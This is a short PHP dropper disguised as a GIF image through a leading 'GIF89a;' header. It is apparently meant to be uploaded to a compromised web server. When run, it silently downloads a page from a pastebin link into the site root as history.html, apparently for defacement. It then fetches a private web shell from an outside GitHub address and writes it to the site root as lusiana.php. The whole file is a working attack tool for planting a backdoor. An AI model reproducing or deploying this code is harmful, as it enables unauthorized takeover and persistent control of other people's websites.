GIF89a;
UstadCage_48
<?php
error_reporting(0);
$content = file_get_contents('https://pastebin.com/raw/ay6E1zT9');
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/history.html","w");
if(fwrite($fp,$content)){
echo "<font color=#02BC8C>OK</font>";
}else{
echo "<font color=#F64747>ERROR</font>";
}
fclose($fp);
$filename="lusiana.php";
$fget=file_get_contents("https://raw.githubusercontent.com/aprilc0de/Shell-Private/master/shell_priv8_U48.php");
$path=$_SERVER['DOCUMENT_ROOT'];
$fileopen=fopen($_SERVER['DOCUMENT_ROOT']."/$filename",'w');  
$execfile=fwrite($fileopen,$fget);
	if($execfile)
	{
		echo "Success: $path$filename";
	}
	else {
		echo "Failed execute newfile $filename in $path";
	}
?>
